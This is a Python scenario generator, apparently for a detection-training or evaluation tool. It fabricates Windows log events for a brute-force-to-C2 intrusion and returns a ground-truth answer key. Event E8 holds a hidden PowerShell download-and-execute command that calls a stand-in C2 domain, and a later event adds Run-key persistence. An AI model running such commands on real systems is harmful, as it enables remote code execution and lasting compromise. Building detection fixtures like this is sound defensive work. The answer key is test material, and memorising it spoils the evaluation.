"""Scenario CRED-001: credential attack -> PowerShell -> download -> persistence -> C2."""
from __future__ import annotations

from app.scenarios.base import Ctx, register

ATTACKER_IP = "45.155.205.23"
HOST = "win-02.corp.local"
USER = "administrator"
C2_DOMAIN = "update-cdn-live.net"


def generate(ctx: Ctx) -> tuple[list[dict], dict]:
    events: list[dict] = []

    # 1) password guessing (SIEM-style logon records)
    for i in range(5):
        events.append(ctx.ev(
            f"E{i + 1}", i * 8,
            event_time=ctx.ts(i * 8), computer=HOST, account_name=USER,
            src_ip=ATTACKER_IP, dst_ip="10.0.0.22", action="failed_logon",
            logon_type=3, source="windows-security",
        ))

    # 2) success + privileged session
    events.append(ctx.ev("E6", 42, event_time=ctx.ts(42), computer=HOST, account_name=USER,
                         src_ip=ATTACKER_IP, action="successful_logon", logon_type=3,
                         source="windows-security"))
    events.append(ctx.ev("E7", 45, event_time=ctx.ts(45), computer=HOST, account_name=USER,
                         src_ip=ATTACKER_IP, action="special_privileges", privilege="SeDebugPrivilege",
                         source="windows-security"))

    # 3) staged PowerShell download cradle
    events.append(ctx.ev(
        "E8", 50,
        event_time=ctx.ts(50), Computer=HOST, User=USER,
        Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ParentImage="C:\\Windows\\explorer.exe",
        CommandLine="powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://" + C2_DOMAIN + "/load.ps1')\"",
        ProcessId=3120, ParentProcessId=2244, EventID=1, source="sysmon",
    ))

    # 4) DNS + file write + outbound connection
    events.append(ctx.ev("E9", 54, EventID=22, Computer=HOST, User=USER, QueryName=C2_DOMAIN,
                         Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                         ProcessId=3120, source="sysmon"))
    events.append(ctx.ev("E10", 57, EventID=11, Computer=HOST, User=USER,
                         TargetFilename="C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe",
                         Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                         ProcessId=3120, source="sysmon"))
    events.append(ctx.ev("E11", 59, EventID=3, Computer=HOST, User=USER,
                         Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                         ProcessId=3120, DestinationIp=ATTACKER_IP, DestinationPort=443,
                         Protocol="tcp", source="sysmon"))

    # 5) user-executed payload
    events.append(ctx.ev(
        "E12", 63,
        event_time=ctx.ts(63), Computer=HOST, User=USER,
        Image="C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe",
        ParentImage="C:\\Windows\\explorer.exe",
        CommandLine="\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe\" --minimized",
        ProcessId=4010, ParentProcessId=2244, EventID=1, source="sysmon",
    ))

    # 6) persistence + C2 beacon
    events.append(ctx.ev("E13", 67, EventID=13, Computer=HOST, User=USER,
                         TargetFilename="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate",
                         Details="C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe",
                         Image="C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe",
                         ProcessId=4010, source="sysmon"))
    events.append(ctx.ev("E14", 72, EventID=3, Computer=HOST, User=USER,
                         Image="C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe",
                         ProcessId=4010, DestinationIp=ATTACKER_IP, DestinationPort=8443,
                         Protocol="tcp", source="sysmon"))

    ground_truth = {
        "chain_events": [f"E{i}" for i in range(1, 15)],
        "techniques": ["T1110.001", "T1078", "T1059.001", "T1071.004", "T1105",
                       "T1071.001", "T1547.001"],
        "tactics": ["CREDENTIAL ACCESS", "PERSISTENCE", "EXECUTION", "COMMAND AND CONTROL"],
        "narrative": "External password guessing gains a valid account, stages a PowerShell "
                     "download cradle, drops a payload, adds Run-key persistence and beacons to C2.",
        "primary_host": HOST,
        "attacker_ip": ATTACKER_IP,
    }
    return events, ground_truth


register(
    "CRED-001",
    "Credential Attack to C2",
    "Brute force -> valid account -> PowerShell download -> payload -> registry persistence -> C2 beacon.",
    False,
    generate,
)
